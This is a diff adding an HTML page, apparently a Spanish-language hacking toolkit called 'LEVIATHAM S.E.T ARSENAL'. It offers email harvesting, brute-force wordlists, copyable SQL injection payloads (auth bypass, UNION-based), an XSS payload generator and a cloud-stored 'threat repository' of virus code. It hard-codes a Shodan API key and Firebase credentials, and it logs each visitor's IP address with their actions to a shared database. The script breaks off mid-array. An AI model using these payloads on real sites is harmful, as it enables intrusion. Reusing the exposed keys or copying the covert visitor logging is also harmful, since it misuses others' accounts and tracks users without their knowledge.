@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>LEVIATHAM S.E.T ARCENAL</title>
+    
+    <!-- Tailwind CSS -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    
+    <!-- FontAwesome -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=VT323&display=swap" rel="stylesheet">
+
+    <!-- MD5 Library -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/blueimp-md5/2.19.0/js/md5.min.js"></script>
+
+    <style>
+        :root {
+            --hacker-green: #0f0;
+            --hacker-dark: #050505;
+            --panel-bg: rgba(0, 20, 0, 0.95);
+            --gold: #ffd700;
+        }
+
+        body {
+            background-color: var(--hacker-dark);
+            color: var(--hacker-green);
+            font-family: 'Share Tech Mono', monospace;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+
+        /* --- CRT Effect --- */
+        .crt::before {
+            content: " ";
+            display: block;
+            position: absolute;
+            top: 0; left: 0; bottom: 0; right: 0;
+            background: linear-gradient(rgba(18, 16, 16, 0) 50%, rgba(0, 0, 0, 0.25) 50%), linear-gradient(90deg, rgba(255, 0, 0, 0.06), rgba(0, 255, 0, 0.02), rgba(0, 0, 255, 0.06));
+            z-index: 2;
+            background-size: 100% 2px, 3px 100%;
+            pointer-events: none;
+        }
+        
+        .glow-text { text-shadow: 0 0 5px var(--hacker-green); }
+        .glow-gold { text-shadow: 0 0 5px var(--gold); color: var(--gold); }
+        
+        /* Custom Scrollbar */
+        ::-webkit-scrollbar { width: 8px; }
+        ::-webkit-scrollbar-track { background: #001100; }
+        ::-webkit-scrollbar-thumb { background: #004400; border: 1px solid var(--hacker-green); }
+
+        /* Panels */
+        .tool-panel {
+            border: 1px solid #004400;
+            background: var(--panel-bg);
+            box-shadow: 0 0 10px rgba(0, 255, 0, 0.1);
+            transition: all 0.3s;
+            position: relative;
+            overflow: hidden;
+        }
+        .tool-panel:hover {
+            border-color: var(--hacker-green);
+            box-shadow: 0 0 20px rgba(0, 255, 0, 0.2);
+        }
+
+        /* Canvas Background */
+        #canvas-bg {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+        }
+
+        /* Database Logs */
+        .db-log {
+            font-family: 'VT323', monospace;
+            border-bottom: 1px solid #003300;
+            padding: 4px;
+            font-size: 1.0em;
+            line-height: 1.2;
+        }
+        
+        .matrix-bg {
+            position: absolute; top:0; left:0; width:100%; height:100%; z-index:0; opacity: 0.1; pointer-events: none;
+        }
+
+        /* Frequency Bar */
+        .freq-bar-container { display: flex; align-items: center; margin-bottom: 2px; }
+        .freq-label { width: 20px; font-size: 10px; color: #fff; }
+        .freq-bar { height: 8px; background: var(--hacker-green); transition: width 0.5s; }
+
+        /* ADMIN PANEL STYLES */
+        #admin-modal {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0,0,0,0.98); z-index: 60; display: none;
+            justify-content: center; align-items: center;
+        }
+        .admin-box {
+            border: 2px solid var(--hacker-green);
+            background: #000;
+            padding: 20px;
+            width: 95%; max-width: 900px; height: 90vh;
+            display: flex; flex-direction: column;
+            box-shadow: 0 0 30px rgba(0, 255, 0, 0.3);
+        }
+        .admin-login {
+            max-width: 400px; height: auto; text-align: center;
+        }
+        .list-item {
+            cursor: pointer; padding: 5px; border-bottom: 1px solid #003300; font-size: 12px;
+        }
+        .list-item:hover, .list-item.active {
+            background: #002200; color: #fff;
+        }
+        .active-tab {
+            background: rgba(0, 255, 0, 0.2);
+            border-color: var(--hacker-green) !important;
+        }
+    </style>
+</head>
+<body class="crt">
+
+    <canvas id="canvas-bg"></canvas>
+
+    <!-- ADMIN MODAL -->
+    <div id="admin-modal">
+        
+        <!-- LOGIN SCREEN -->
+        <div id="admin-login-screen" class="admin-box admin-login">
+            <h2 class="text-xl font-bold mb-4 text-red-500 animate-pulse">ACCESO RESTRINGIDO</h2>
+            <p class="text-xs text-gray-400 mb-4">Ingrese credenciales de administrador</p>
+            <input type="password" id="admin-pass" class="w-full bg-black border border-red-800 p-2 text-center text-red-500 mb-4 focus:outline-none" placeholder="PASSWORD">
+            <button onclick="adminLogin()" class="w-full bg-red-900/50 border border-red-600 text-red-400 py-2 font-bold hover:bg-red-800 transition">ENTRAR</button>
+            <button onclick="toggleAdmin()" class="mt-2 text-xs text-gray-500 hover:text-white underline">Cancelar</button>
+        </div>
+
+        <!-- DASHBOARD SCREEN -->
+        <div id="admin-dashboard" class="admin-box hidden">
+            <div class="flex justify-between items-center mb-4 border-b border-green-800 pb-2">
+                <h2 class="text-xl font-bold text-green-400"><i class="fa-solid fa-cogs"></i> PANEL DE CONTROL GLOBAL (FIREBASE)</h2>
+                <div class="flex gap-2 items-center">
+                    <span id="save-status" class="text-xs text-yellow-500 hidden">Guardando en nube...</span>
+                    <button onclick="toggleAdmin()" class="text-red-500 hover:text-white text-2xl"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+            </div>
+
+            <!-- TABS -->
+            <div class="flex gap-2 mb-4">
+                <button onclick="switchAdminTab('xss')" id="tab-xss" class="flex-1 py-2 border border-green-800 text-xs font-bold bg-green-900/20 active-tab">GENERADOR XSS</button>
+                <button onclick="switchAdminTab('threats')" id="tab-threats" class="flex-1 py-2 border border-red-800 text-xs font-bold text-red-400 bg-red-900/10">THREAT REPOSITORY</button>
+            </div>
+
+            <!-- CONTENT -->
+            <div class="flex flex-1 gap-4 overflow-hidden">
+                <!-- LIST -->
+                <div class="w-1/3 border-r border-green-900 overflow-y-auto pr-2" id="admin-list">
+                    <!-- Populated by JS -->
+                </div>
+
+                <!-- EDITOR -->
+                <div class="w-2/3 flex flex-col">
+                    <input type="hidden" id="edit-index">
+                    <div class="mb-2">
+                        <label class="text-xs text-gray-500">NOMBRE DEL SCRIPT (Etiqueta Global):</label>
+                        <input type="text" id="edit-name" class="w-full bg-gray-900 border border-green-800 p-2 text-sm text-green-300 focus:border-green-500 focus:outline-none">
+                    </div>
+                    <div class="flex-1 mb-2 flex flex-col">
+                        <label class="text-xs text-gray-500">CÓDIGO (Max 5000 chars):</label>
+                        <textarea id="edit-code" class="flex-1 bg-gray-900 border border-green-800 p-2 text-xs font-mono text-yellow-500 focus:border-green-500 focus:outline-none resize-none overflow-auto" placeholder="Pega tu código aquí..." maxlength="5000"></textarea>
+                        <div class="text-[9px] text-right text-gray-600 mt-1">Se guardará globalmente en Firebase. Capacidad Aumentada.</div>
+                    </div>
+                    <div class="flex gap-2">
+                        <button onclick="saveScriptData()" class="flex-1 bg-green-700 hover:bg-green-600 text-black font-bold py-2 text-sm transition shadow-[0_0_10px_rgba(0,255,0,0.3)]">GUARDAR EN CLOUD</button>
+                        <button onclick="resetToDefault()" class="px-4 border border-red-800 text-red-500 hover:bg-red-900/30 text-xs" title="Restaurar valores de fábrica">RESET</button>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- HEADER -->
+    <header class="p-4 border-b border-green-900 bg-black/80 sticky top-0 z-50 backdrop-blur-sm">
+        <div class="max-w-7xl mx-auto flex justify-between items-center">
+            <div class="flex items-center gap-3">
+                <i class="fa-solid fa-shield-halved text-3xl animate-pulse text-red-500"></i>
+                <div>
+                    <h1 class="text-2xl font-bold glow-text tracking-widest uppercase">LEVIATHAM <span class="text-xs align-top opacity-70 bg-green-900 px-1 text-black font-bold">S.E.T ARSENAL</span></h1>
+                    <p class="text-[10px] text-green-600">SECURITY // EXPLOITATION // TOOLS</p>
+                </div>
+            </div>
+            
+            <div class="flex items-center gap-4">
+                <button onclick="toggleAdmin()" class="bg-red-900/20 hover:bg-red-900/50 text-red-400 border border-red-600 px-3 py-1 text-xs font-bold uppercase transition rounded animate-pulse shadow-[0_0_15px_rgba(255,0,0,0.2)]">
+                    <i class="fa-solid fa-lock mr-1"></i> ADMIN
+                </button>
+                <a href="Manual.html" class="bg-blue-900/50 hover:bg-blue-700 text-blue-300 border border-blue-600 px-3 py-1 text-xs font-bold uppercase transition rounded">
+                    <i class="fa-solid fa-book-open mr-1"></i> Manual para usuarios nuevos
+                </a>
+                <div class="text-xs text-right hidden sm:block">
+                    <div id="connection-status" class="text-yellow-500"><i class="fa-solid fa-satellite-dish animate-spin"></i> CONECTANDO A FIREBASE...</div>
+                    <div id="my-ip-display" class="text-gray-500">IP: Detectando...</div>
+                </div>
+            </div>
+        </div>
+    </header>
+
+    <main class="max-w-7xl mx-auto p-4 grid grid-cols-1 lg:grid-cols-3 gap-6 relative z-10">
+
+        <!-- COLUMNA 1: OSINT & RECON -->
+        <div class="space-y-6">
+            <h2 class="text-xl border-b border-green-700 pb-2 mb-4 font-bold"><i class="fa-solid fa-eye"></i> SECCIÓN 1: RECONOCIMIENTO</h2>
+            
+            <!-- EMAIL HARVESTER V3 -->
+            <div class="tool-panel p-4 rounded min-h-[280px]">
+                <div class="matrix-bg"></div>
+                <h3 class="font-bold text-lg mb-2 text-green-300 relative z-10">EMAIL HARVESTER V3</h3>
+                <p class="text-[10px] text-gray-400 mb-2 relative z-10">Búsqueda profunda de correos y fugas.</p>
+                
+                <div class="space-y-3 relative z-10">
+                    <input type="text" id="target-domain" class="w-full bg-black border border-green-500 p-2 text-sm text-white focus:outline-none focus:shadow-[0_0_10px_#0f0]" placeholder="ejemplo: empresa.com">
+                    
+                    <button onclick="runEmailHarvester()" class="w-full bg-green-900/50 hover:bg-green-700 text-white py-2 border border-green-600 uppercase text-xs font-bold tracking-widest transition flex items-center justify-center gap-2">
+                        <i class="fa-solid fa-spider"></i> EJECUTAR CRAWLER
+                    </button>
+                    
+                    <div id="harvester-output" class="h-40 bg-black border border-green-900 p-2 text-[10px] overflow-y-auto font-mono text-green-400 scrollbar-hide">
+                        > Sistema listo. Ingrese objetivo.
+                    </div>
+                </div>
+            </div>
+
+            <!-- LINK SCRAPER ADVANCED -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">EXTRACTOR WEB (LINKS/DATA)</h3>
+                <p class="text-[10px] text-gray-400 mb-2">Extrae enlaces, imágenes, scripts y correos públicos.</p>
+                <div class="flex gap-2 mb-2">
+                    <input type="text" id="scraper-url" class="flex-1 bg-black border border-green-500 p-2 text-sm" placeholder="https://sitio.com">
+                    <button onclick="scrapeLinks()" class="bg-purple-900/50 border border-purple-600 px-3 text-xs font-bold hover:bg-purple-800">SCRAPE</button>
+                </div>
+                <div id="scraper-output" class="h-32 bg-black border border-green-900 p-2 text-[10px] overflow-y-auto font-mono text-purple-300 whitespace-pre-wrap"></div>
+            </div>
+
+            <!-- WAF DETECTOR -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">DETECTOR DE WAF</h3>
+                <div class="flex gap-2 mb-2">
+                    <input type="text" id="waf-url" class="flex-1 bg-black border border-green-500 p-2 text-sm" placeholder="https://objetivo.com">
+                    <button onclick="detectWAF()" class="bg-orange-900/50 border border-orange-600 px-3 text-xs font-bold hover:bg-orange-800">SCAN</button>
+                </div>
+                <div id="waf-output" class="text-xs font-mono text-orange-400 min-h-[1.5em]"></div>
+            </div>
+
+            <!-- URL UNSHORTENER -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">DESACORTADOR URL (OPSEC)</h3>
+                <div class="flex gap-2 mb-2">
+                    <input type="text" id="short-url" class="flex-1 bg-black border border-green-500 p-2 text-sm" placeholder="bit.ly/...">
+                    <button onclick="unshortenURL()" class="bg-blue-900/50 border border-blue-600 px-3 text-xs font-bold hover:bg-blue-800">REVELAR</button>
+                </div>
+                <div id="unshorten-result" class="text-xs font-mono text-blue-300 break-all"></div>
+            </div>
+
+            <!-- HEADER INSPECTOR -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">ANALIZADOR DE CABECERAS</h3>
+                <p class="text-[10px] text-gray-400 mb-1">Verifica CSP, HSTS, X-Frame y fugas de info.</p>
+                <div class="flex gap-2 mb-2">
+                    <input type="text" id="header-url" class="flex-1 bg-black border border-green-500 p-2 text-sm" placeholder="https://sitio.com">
+                    <button onclick="inspectHeaders()" class="bg-blue-900/50 border border-blue-600 px-3 text-xs font-bold hover:bg-blue-800">SCAN</button>
+                </div>
+                <div id="header-output" class="h-24 bg-black border border-green-900 p-2 text-[10px] overflow-y-auto font-mono"></div>
+            </div>
+        </div>
+
+        <!-- COLUMNA 2: WEAPONIZATION & NETWORK -->
+        <div class="space-y-6">
+            <h2 class="text-xl border-b border-green-700 pb-2 mb-4 font-bold"><i class="fa-solid fa-hammer"></i> SECCIÓN 2: WEAPONIZATION</h2>
+
+            <!-- WORDLIST GENERATOR PRO -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">GENERADOR DICCIONARIOS PRO</h3>
+                <div class="grid grid-cols-2 gap-2 mb-2">
+                    <input type="text" id="wl-name" class="bg-black border border-green-800 p-1 text-sm" placeholder="Nombre">
+                    <input type="text" id="wl-surname" class="bg-black border border-green-800 p-1 text-sm" placeholder="Apellido">
+                    <input type="text" id="wl-year" class="bg-black border border-green-800 p-1 text-sm" placeholder="Año Nacimiento">
+                    <input type="text" id="wl-pet" class="bg-black border border-green-800 p-1 text-sm" placeholder="Mascota">
+                    <input type="text" id="wl-extra" class="bg-black border border-green-800 p-1 text-sm col-span-2" placeholder="Dato Extra (Apodo, Ciudad...)">
+                    <input type="text" id="wl-custom" class="bg-black border border-green-800 p-1 text-sm col-span-2 text-yellow-500" placeholder="Patrón Personalizado (ej: admin_%)">
+                </div>
+                
+                <div class="mb-3">
+                    <label class="text-[10px] text-gray-400 block mb-1">DURACIÓN DEL MOTOR:</label>
+                    <select id="wl-duration" class="w-full bg-black border border-green-800 text-xs p-1">
+                        <option value="60000">1 Minuto (Rápido)</option>
+                        <option value="300000">5 Minutos (Profundo)</option>
+                        <option value="1800000">30 Minutos (Intensivo)</option>
+                        <option value="3600000">1 Hora (Extremo)</option>
+                    </select>
+                </div>
+
+                <button onclick="generateWordlist()" id="btn-wordlist" class="w-full bg-green-900/50 hover:bg-green-700 py-2 border border-green-600 text-xs font-bold mb-2">
+                    INICIAR MOTOR DE FUERZA BRUTA
+                </button>
+                <div id="wl-progress" class="hidden w-full bg-gray-900 rounded-full h-2.5 mb-2 border border-green-900 relative">
+                    <div id="wl-bar" class="bg-green-500 h-2.5 rounded-full" style="width: 0%"></div>
+                    <span id="wl-time-left" class="absolute top-[-15px] right-0 text-[9px]"></span>
+                </div>
+                <div id="wl-preview" class="text-[10px] text-gray-500 h-16 overflow-hidden border-t border-green-900/30 pt-1 font-mono"></div>
+            </div>
+
+            <!-- SQL INJECTION GENERATOR -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">GENERADOR SQLi</h3>
+                <select id="sqli-select" class="w-full bg-black border border-green-800 p-2 text-sm mb-2 text-green-500 font-mono">
+                    <option value="' OR '1'='1">Auth Bypass Basic</option>
+                    <option value="' UNION SELECT null, version() --">Version Check</option>
+                    <option value="admin' --">Username Comment</option>
+                    <option value="' AND 1=1 --">Boolean True</option>
+                    <option value="' ORDER BY 1 --">Column Enumeration</option>
+                </select>
+                <button onclick="copyToClipboard('sqli-select')" class="w-full bg-blue-900/30 hover:bg-blue-700 py-1 border border-blue-600 text-xs font-bold flex items-center justify-center gap-2">
+                    <i class="fa-regular fa-copy"></i> COPIAR PAYLOAD
+                </button>
+            </div>
+
+            <!-- MAC OUI LOOKUP -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">FABRICANTE MAC (OUI)</h3>
+                <div class="flex gap-2 mb-2">
+                    <input type="text" id="mac-input" class="flex-1 bg-black border border-green-500 p-2 text-sm" placeholder="00:1A:2B:XX:XX:XX">
+                    <button onclick="lookupMAC()" class="bg-gray-800 border border-gray-600 px-3 text-xs font-bold hover:bg-gray-700">BUSCAR</button>
+                </div>
+                <div id="mac-result" class="text-xs font-mono text-yellow-500"></div>
+            </div>
+
+            <!-- IP CALCULATOR -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">CALCULADORA DE SUBRED</h3>
+                <div class="flex gap-2 mb-2">
+                    <input type="text" id="ip-cidr" class="flex-1 bg-black border border-green-500 p-2 text-sm" placeholder="IP/CIDR (ej: 192.168.1.0/24)">
+                    <button onclick="calcSubnet()" class="bg-gray-800 border border-gray-600 px-3 text-xs font-bold hover:bg-gray-700">CALC</button>
+                </div>
+                <div id="subnet-result" class="text-[10px] font-mono text-yellow-500 whitespace-pre-wrap"></div>
+            </div>
+        </div>
+
+        <!-- COLUMNA 3: DATA, CONTROL & FORENSICS -->
+        <div class="space-y-6">
+            <h2 class="text-xl border-b border-green-700 pb-2 mb-4 font-bold"><i class="fa-solid fa-database"></i> SECCIÓN 3: CONTROL & BLUE TEAM</h2>
+
+            <!-- ENCODER / DECODER -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">ENCODER / DECODER</h3>
+                <textarea id="encode-input" class="w-full h-12 bg-black border border-green-800 text-[10px] p-1 mb-2" placeholder="Input..."></textarea>
+                <div class="grid grid-cols-4 gap-1 mb-2">
+                    <button onclick="doEncode('b64')" class="bg-gray-800 text-[9px] hover:bg-gray-700 border border-gray-600">Base64</button>
+                    <button onclick="doEncode('hex')" class="bg-gray-800 text-[9px] hover:bg-gray-700 border border-gray-600">Hex</button>
+                    <button onclick="doEncode('url')" class="bg-gray-800 text-[9px] hover:bg-gray-700 border border-gray-600">URL</button>
+                    <button onclick="doEncode('bin')" class="bg-gray-800 text-[9px] hover:bg-gray-700 border border-gray-600">Bin</button>
+                </div>
+                <div class="relative">
+                    <textarea id="encode-output" class="w-full h-12 bg-black border border-green-500 text-[10px] p-1 text-yellow-500 pr-8" readonly placeholder="Output..."></textarea>
+                    <button onclick="copyToClipboard('encode-output')" class="absolute top-1 right-1 text-green-500 hover:text-white" title="Copiar"><i class="fa-regular fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- FREQUENCY ANALYZER -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">CRIPTOANÁLISIS (FRECUENCIA)</h3>
+                <input type="text" id="freq-input" oninput="analyzeFrequency()" class="w-full bg-black border border-green-500 p-2 text-sm mb-2" placeholder="Texto cifrado...">
+                <div id="freq-stats" class="text-[9px] text-yellow-500 mb-1 font-mono"></div>
+                <div id="freq-chart" class="h-20 bg-black border border-green-900 p-2 overflow-y-auto"></div>
+            </div>
+
+            <!-- CUSTOM PAYLOAD GENERATOR XSS (15 SLOTS) -->
+            <div class="tool-panel p-4 rounded">
+                <h3 class="font-bold text-lg mb-2 text-green-300">GENERADOR XSS PERSONALIZABLE</h3>
+                <p class="text-[10px] text-gray-400 mb-2">Scripts cargados desde Servidor Global.</p>
+                <div class="relative">
+                    <select id="payload-type" class="w-full bg-black border border-green-800 p-2 text-sm mb-2 text-green-500 font-mono">
+                        <option>Cargando datos...</option>
+                    </select>
+                </div>
+                <button onclick="generatePayload()" class="w-full bg-green-900/50 hover:bg-green-700 py-2 border border-green-600 text-xs font-bold">
+                    GENERAR PAYLOAD
+                </button>
+                <div class="relative mt-2">
+                    <textarea id="payload-output" class="w-full h-20 bg-black border border-green-900 text-[10px] p-1 font-mono text-yellow-500 pr-8" readonly></textarea>
+                    <button onclick="copyToClipboard('payload-output')" class="absolute top-1 right-1 text-green-500 hover:text-white" title="Copiar"><i class="fa-regular fa-copy"></i></button>
+                </div>
+            </div>
+
+            <!-- THREAT REPOSITORY (15 SLOTS) -->
+            <div class="tool-panel p-4 rounded border-red-900 border">
+                <h3 class="font-bold text-lg mb-2 text-red-500 animate-pulse">REPOSITORIO DE AMENAZAS</h3>
+                <p class="text-[10px] text-gray-400 mb-2">Base de datos Global (Firebase).</p>
+                <select id="virus-select" class="w-full bg-black border border-red-800 p-2 text-sm mb-2 text-red-400 font-mono" onchange="loadVirus()">
+                    <option>Cargando datos...</option>
+                </select>
+                
+                <div class="relative">
+                    <textarea id="virus-code" class="w-full h-32 bg-black border border-red-900 text-[10px] p-2 font-mono text-red-500 pr-8 overflow-y-auto whitespace-pre-wrap" maxlength="5000"></textarea>
+                    <button onclick="copyToClipboard('virus-code')" class="absolute top-1 right-1 text-red-500 hover:text-white" title="Copiar"><i class="fa-regular fa-copy"></i></button>
+                    <div class="absolute bottom-1 right-1 text-[9px] text-gray-600">MAX 5000+ CHARS</div>
+                </div>
+            </div>
+
+            <!-- SECCIÓN 4: PRIVACIDAD Y BLUE TEAM -->
+            <div class="tool-panel p-4 rounded border border-blue-900">
+                <h3 class="font-bold text-lg mb-2 text-blue-300"><i class="fa-solid fa-user-shield"></i> PRIVACIDAD & FORENSICS</h3>
+                
+                <!-- STEGANOGRAPHY -->
+                <div class="mb-4 border-b border-blue-900 pb-2">
+                    <h4 class="text-xs font-bold text-blue-400 mb-1">ESTEGANOGRAFÍA DE TEXTO</h4>
+                    <p class="text-[9px] text-gray-500 mb-1">Oculta mensaje A dentro de B.</p>
+                    <input type="text" id="stego-cover" class="w-full bg-black border border-blue-800 p-1 text-xs mb-1" placeholder="Texto Visible (Cover)">
+                    <input type="text" id="stego-secret" class="w-full bg-black border border-blue-800 p-1 text-xs mb-1" placeholder="Secreto">
+                    <div class="flex gap-1">
+                        <button onclick="stegoHide()" class="flex-1 bg-blue-900/50 text-[10px] py-1 border border-blue-600">OCULTAR</button>
+                        <button onclick="stegoReveal()" class="flex-1 bg-blue-900/50 text-[10px] py-1 border border-blue-600">REVELAR</button>
+                    </div>
+                    <div class="relative mt-1">
+                        <input type="text" id="stego-result" class="w-full bg-black border border-blue-500 text-[10px] p-1 text-yellow-500 pr-6" readonly>
+                        <button onclick="copyToClipboard('stego-result')" class="absolute top-0 right-0 text-blue-500 p-1"><i class="fa-regular fa-copy"></i></button>
+                    </div>
+                </div>
+
+                <!-- BROWSER FINGERPRINT -->
+                <div class="mb-4 border-b border-blue-900 pb-2">
+                    <h4 class="text-xs font-bold text-blue-400 mb-1">HUELLA DIGITAL (FINGERPRINT)</h4>
+                    <button onclick="getFingerprint()" class="w-full bg-blue-900/50 hover:bg-blue-700 py-1 border border-blue-600 text-xs mb-1">ESCANÉAME</button>
+                    <textarea id="fingerprint-out" class="w-full h-16 bg-black border border-blue-900 text-[9px] p-1 font-mono text-blue-200" readonly></textarea>
+                </div>
+
+                <!-- LEET PASS MUTATOR -->
+                <div class="mb-4 border-b border-blue-900 pb-2">
+                    <h4 class="text-xs font-bold text-blue-400 mb-1">GENERADOR LEET (MUTATOR)</h4>
+                    <div class="flex gap-1">
+                        <input type="text" id="leet-input" class="flex-1 bg-black border border-blue-800 p-1 text-xs" placeholder="pass">
+                        <button onclick="leetMutate()" class="bg-blue-900/50 px-2 border border-blue-600 text-xs">GO</button>
+                    </div>
+                    <div id="leet-result" class="text-[10px] font-mono text-yellow-500 mt-1 cursor-pointer" onclick="copyToClipboard('leet-result')"></div>
+                </div>
+
+                <!-- API FUZZER AUTOMATIZADO -->
+                <div>
+                    <h4 class="text-xs font-bold text-blue-400 mb-1">API FUZZER (AUTO-REDIRECT)</h4>
+                    <input type="text" id="fuzz-url" class="w-full bg-black border border-blue-800 p-1 text-xs mb-1" placeholder="https://api.com/v1/user/">
+                    <input type="text" id="fuzz-range" class="w-full bg-black border border-blue-800 p-1 text-xs mb-1" placeholder="Rango: 1-5">
+                    <div class="flex gap-1 mb-1">
+                        <button onclick="generateFuzzList()" class="flex-1 bg-blue-900/50 py-1 border border-blue-600 text-xs">GENERAR</button>
+                        <button onclick="openAllLinks()" class="bg-red-900/50 py-1 border border-red-600 text-xs px-2 text-red-300" title="Abrir todas las rutas (Popup Blocker!)">OPEN ALL</button>
+                    </div>
+                    <!-- Cambiado de textarea a div para links clicables -->
+                    <div id="fuzz-out" class="w-full h-32 bg-black border border-blue-900 text-[9px] p-1 font-mono mt-1 overflow-y-auto"></div>
+                </div>
+            </div>
+
+            <!-- FIREBASE LOGS -->
+            <div class="tool-panel p-4 rounded h-[200px] flex flex-col relative overflow-hidden">
+                <div class="absolute top-0 right-0 p-1">
+                    <i class="fa-brands fa-google text-green-700 opacity-20 text-6xl"></i>
+                </div>
+                <h3 class="font-bold text-lg mb-2 text-green-300 border-b border-green-900 pb-1">
+                    <i class="fa-solid fa-database"></i> DB GLOBAL
+                </h3>
+                <div id="firebase-logs" class="flex-1 overflow-y-auto space-y-1 bg-black/80 p-2 border border-green-900/50">
+                    <div class="text-center text-gray-500 text-xs mt-10"><i class="fa-solid fa-circle-notch animate-spin"></i> Sincronizando...</div>
+                </div>
+            </div>
+        </div>
+
+    </main>
+
+    <!-- FIREBASE MODULE -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, collection, addDoc, onSnapshot, query, orderBy, limit, serverTimestamp, doc, getDoc, setDoc } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyC9E1Ra6vlp9LQSZwv3L3s6PCLtqZd-vWs",
+            authDomain: "lebo-e7185.firebaseapp.com",
+            projectId: "lebo-e7185",
+            storageBucket: "lebo-e7185.firebasestorage.app",
+            messagingSenderId: "663191766186",
+            appId: "1:663191766186:web:31e08ad75c933569e27cd3"
+        };
+
+        let db;
+        let userPublicIP = "Anon";
+
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                userPublicIP = data.ip;
+                document.getElementById('my-ip-display').innerText = `IP: ${userPublicIP}`;
+            })
+            .catch(() => { userPublicIP = "Hidden/Proxy"; });
+
+        try {
+            const app = initializeApp(firebaseConfig);
+            db = getFirestore(app);
+            document.getElementById('connection-status').innerHTML = '<span class="text-green-500 font-bold">● ONLINE</span> FIREBASE';
+            
+            // LOGS LISTENER
+            const q = query(collection(db, "audit_logs"), orderBy("timestamp", "desc"), limit(30));
+            onSnapshot(q, (snapshot) => {
+                const logContainer = document.getElementById('firebase-logs');
+                logContainer.innerHTML = '';
+                snapshot.forEach((doc) => {
+                    const data = doc.data();
+                    const div = document.createElement('div');
+                    div.className = 'db-log text-[10px] hover:bg-green-900/20';
+                    const time = data.timestamp ? new Date(data.timestamp.toDate()).toLocaleTimeString() : '...';
+                    
+                    let displayIP = data.user_ip || "Unknown";
+                    if(displayIP.includes('.')) {
+                        const parts = displayIP.split('.');
+                        if(parts.length === 4) displayIP = `${parts[0]}.${parts[1]}.${parts[2]}.xxx`;
+                    }
+                    
+                    div.innerHTML = `
+                        <div class="flex justify-between text-green-600">
+                            <span>[${time}]</span>
+                            <span class="text-gray-500">${displayIP}</span>
+                        </div>
+                        <div class="text-green-300 font-bold">> ${data.tool}</div>
+                        <div class="text-gray-400 pl-2 break-all">${data.action}</div>
+                    `;
+                    logContainer.appendChild(div);
+                });
+            });
+
+            // GLOBAL CONFIG LISTENER (For Scripts)
+            const configRef = doc(db, "global_config", "tools");
+            onSnapshot(configRef, (docSnap) => {
+                if (docSnap.exists()) {
+                    const data = docSnap.data();
+                    if(data.xss) {
+                        window.customXSS = data.xss;
+                        // Since customXSS is global but handled in non-module script, 
+                        // we need to call populateDropdown if it exists
+                        if(window.populateDropdown) window.populateDropdown('payload-type', window.customXSS);
+                    }
+                    if(data.threats) {
+                        window.customThreats = data.threats;
+                        if(window.populateDropdown) window.populateDropdown('virus-select', window.customThreats);
+                    }
+                } else {
+                    // Initialize if empty
+                    saveToFirebase(); 
+                }
+            });
+
+            const saveToFirebase = async () => {
+                // Initial default state for DB using window vars if available, or hardcoded defaults
+                const initialData = {
+                    xss: window.customXSS,
+                    threats: window.customThreats
+                };
+                try {
+                    await setDoc(configRef, initialData);
+                    console.log("Database initialized with defaults");
+                } catch(e) {
+                    console.error("Auto-init error", e);
+                }
+            };
+
+            // EXPORT GLOBAL FUNCTIONS FOR ADMIN
+            window.logToFirebase = async (tool, action) => {
+                try {
+                    await addDoc(collection(db, "audit_logs"), {
+                        tool: tool,
+                        action: action,
+                        user_ip: userPublicIP,
+                        timestamp: serverTimestamp()
+                    });
+                } catch (e) { console.error("Log Error:", e); }
+            };
+
+            window.saveAdminConfigToFirebase = async (xssData, threatsData) => {
+                try {
+                    await setDoc(doc(db, "global_config", "tools"), {
+                        xss: xssData,
+                        threats: threatsData
+                    }, { merge: true });
+                    return true;
+                } catch(e) {
+                    console.error("Save Error", e);
+                    alert("Error guardando en Firebase: " + e.message);
+                    return false;
+                }
+            };
+
+        } catch (e) {
+            console.error("Init Error:", e);
+            document.getElementById('connection-status').innerHTML = '<span class="text-red-500">OFFLINE</span>';
+        }
+    </script>
+
+    <!-- TOOLS LOGIC -->
+    <script>
+        const SHODAN_KEY = "szTfqeE2lumjOm7BdUkdzxw60NptHGxv";
+        const PROXY = "https://corsproxy.io/?";
+
+        // =========================================================================
+        // --- DATA STRUCTURES (Synced with Firebase) ---
+        // =========================================================================
+        
+        // Define on window so module script can access/update them
+        window.customXSS = [
